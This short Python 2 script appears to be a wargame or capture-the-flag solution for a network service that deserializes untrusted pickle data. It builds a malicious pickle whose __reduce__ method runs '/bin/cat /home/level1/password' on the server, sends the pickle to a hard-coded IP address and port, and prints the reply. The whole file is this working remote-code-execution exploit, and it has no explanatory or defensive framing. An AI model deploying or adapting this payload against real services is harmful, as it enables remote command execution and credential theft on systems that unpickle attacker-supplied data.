import cPickle
import subprocess
import socket

class Boom(object):
    def __reduce__(self):
        return(subprocess.call, (('/bin/cat', '/home/level1/password'),0,None,4,4,4))


message = cPickle.dumps(Boom())
#print(message)
server = "174.36.209.18"
port = 54321
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.send(message)
while 1: 
    data = s.recv(2048)
    if not data:
        break
    print("Recived -> " + data)

s.close()

